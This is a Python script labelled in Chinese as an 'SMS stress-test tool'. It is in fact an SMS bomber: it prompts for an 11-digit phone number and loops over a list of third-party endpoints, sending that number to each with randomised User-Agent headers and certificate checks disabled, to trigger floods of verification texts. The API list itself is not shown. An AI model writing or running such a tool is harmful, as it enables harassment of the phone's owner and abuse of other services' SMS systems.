def send(api, phone):
    h = {'User-Agent': random.choice(UA), 'Content-Type': api['ct']}
    d = {api['field']: phone, **api['extra']}
    try:
        if api['method'] == 'POST':
            if 'json' in api['ct']:
                requests.post(api['url'], json=d, headers=h, timeout=10, verify=False)
            else:
                requests.post(api['url'], data=d, headers=h, timeout=10, verify=False)
        else:
            requests.get(api['url'], params=d, headers=h, timeout=10, verify=False)
        return True
    except:
        return False

def main():
    print("="*50)
    print("短信测压工具")
    print("="*50)
    phone = input("请输入手机号: ").strip()
    if not phone.isdigit() or len(phone) != 11:
        print("手机号格式错误"); return
    ok = 0
    for i, api in enumerate(APIS, 1):
        r = send(api, phone)
        print(f"[{i}/{len(APIS)}] {'OK' if r else 'FAIL'} {api['url'][:50]}")
        ok += r
        time.sleep(0.1)
    print(f"\n完成: {ok}/{len(APIS)}")

if __name__ == '__main__':
    main()
    
